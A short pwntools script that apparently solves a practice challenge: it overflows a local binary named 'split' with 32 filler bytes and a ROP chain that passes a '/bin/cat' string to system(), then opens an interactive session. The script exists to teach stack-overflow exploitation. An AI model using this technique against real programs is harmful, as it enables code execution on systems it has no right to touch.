from pwn import *

sh = process("./split")

# address
system = p64(0x00400560)            # system()
bin_cat = p64(0x0000000000601060)   # '/bin/cat'
deadbeef = p64(0xdeadbeef)          # 0xdeadbeef

# gadget
pop_rdi = p64(0x00000000004007c3)   # pop rdi;ret

payload = b'a'*32 + deadbeef + pop_rdi + bin_cat + system

sh.sendline(payload)
sh.interactive()
